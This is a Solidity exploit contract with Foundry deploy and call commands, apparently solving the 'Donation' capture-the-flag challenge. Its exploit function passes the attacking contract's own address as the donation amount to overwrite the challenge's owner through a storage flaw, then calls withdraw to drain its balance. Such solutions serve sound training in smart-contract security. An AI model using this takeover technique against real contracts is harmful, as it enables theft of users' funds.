// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";


interface IDonationChallenge {

    function DonationChallenge() external; 
    
    function isComplete() external view returns (bool); 

    function donate(uint256 etherAmount) external payable; 

    function withdraw() external; 
}

//部署: forge create src/Donation.sol:DonationChallenge --rpc-url $RPC --private-key=$PRIVATE_KEY --value '1 wei'
//部署: forge create script/Donation.s.sol:DonationHack --rpc-url $RPC --private-key=$PRIVATE_KEY --constructor-args '0x19e24da4ff38B837d996fcc30a483F84FF35A750'
//查看: cast call 0x07fe1E003a8936195A2AcBaC1665404b38bc28ab "getDonateValue()(uint256)" --rpc-url $RPC
//调用: cast send 0x07fe1E003a8936195A2AcBaC1665404b38bc28ab "exploit()" --rpc-url $RPC --private-key $PRIVATE_KEY --value '45629938122'
//查看: cast call 0x07fe1E003a8936195A2AcBaC1665404b38bc28ab "getStatus()(bool)" --rpc-url $RPC
contract DonationHack {

    IDonationChallenge public challenge;

    constructor(address addr){
        challenge = IDonationChallenge(addr);
    }

    function exploit () external payable{
        challenge.donate{value:msg.value}(uint256(uint160(address(this))));
        challenge.withdraw();
    }

    function getDonateValue() external view returns (uint256){
        uint256 scale = 10**18 * 1 ether;
        return uint256(uint160(address(this))) / scale;
    }

    function getStatus() external view returns(bool){
        return challenge.isComplete();
    }

    receive() external payable {}
} 

